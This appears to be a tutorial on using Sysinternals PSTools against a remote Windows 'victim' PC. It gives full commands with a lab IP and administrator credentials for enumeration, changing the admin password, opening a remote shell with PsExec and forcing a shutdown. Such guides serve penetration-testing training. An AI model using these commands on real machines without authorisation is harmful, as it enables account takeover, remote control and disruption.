Remote Windows PC Enumeration using PSTools

PS Tools Kit is a collection of 13 tools developed by Mark Russinovich. These tools are command-line tool that lets you execute processes on remote systems and redirect console applications’ output to the local system so that these applications appear to be running locally. All of these are special tools that are compatible with the NT windows version or later. Being a console application, these tools can work on both local computer and remote host. These tools require no manual installation of software on the remote system, and they let you specify alternative credentials to access the remote system. The “Ps” prefix in PsList relates to the fact that the standard UNIX process listing command-line tool is named “ps”, so this prefix has been adopted for all the tools in order to tie them together into a suite of tools named PsTools.
You can download PSTool Kit from –> https://technet.microsoft.com/en-us/sysinternals/pstools.aspx
Listed below are all tools in the said tool kit:
Let us now learn how we will use these through command prompt one bye one
Firstly, let us open PSTool Kit and to do so open your command prompt and open PSTool kit using cd command as shown below :

Once you have open PSTool kit, run dir command so that you can see the list of al tools.
Now, we run a command that will help us use PSGetsid tool in the Tool Kit. The command is:
PSGetsidc64.exe \\192.168.1.104 -u administrator -p Ignite@123
Here,
192.168.1.104 –> our victim’s IP
-u –> denotes username
Administrator –> username
-p –> denotes password
Ignite@123 –> password

Executing these commands for system information  of  remote PC.
Next, we will learn about psinfo.exe tool which gives us all the necessary information of the remote PC. To make this tool work type:
psinfo.exe \\192.168.1.104 -u administrator -p Ignite@123

After this command has been run, it will give you the information as you can see above.
Moving forward, we will now make psfile tool work by typing the following command:
psfile64.exe \\192.168.1.104  -u administrator -p Ignite@123

Execution of this command will help us to see every file and directories that are remotely open on the PC of victim.
Our next tool is pslist and to make it work type:
pslist64.exe \\192.168.1.104 -u administrator -p Ignite@123

This command lets us see the list of all the files on our remote PC as seen above.
Our next command is Psservice.exe which lets us know about all the services running on our victims’ PC. The command is:
PsService64.exe \\192.168.1.104 -u administrator -p Ignite@123

You can result in the above pic.
One of these tools helps us to see the logs of victim PC. That tool is psloglist.exe and the command to run this tool is:
psloglist.exe \\192.168.1.104 -u administrator -p Ignite@123

So, like this our command is successful as we have our desired result.
Now, pspasswd64.exe is the most important tool as it lets us to change the password of a PC. And the command to achieve this is:
pspasswd64.exe \\192.168.1.104 -u administrator -p ignite@123 administrator forever
Here,
192.168.1.104 –> our victim’s IP
-u –> denotes username
Administrator –> username
-p –> denotes password
Ignite@123 –> password
Administrator –-> username (which we have to give again to specify that which user’s password we want to change)

This can successfully change the password as shown in above image.
Another important tool is PsExec64.exe which takes us directly in the shell of victim’s PC. Its command is:
PsExec64.exe \\192.168.1.104 -u administrator -p forever cmd

Lastly our next tool helps us to shutdown remote PC. And for that just type:
psshutdown.exe \\192.168.1.104 -u administrator -p forever

And as shown in the image above the remote PC will shutdown in 20 seconds.
So, these were tools in the PSTool kit and the commands to run them. These tools make our work a lot easy and come in handy.
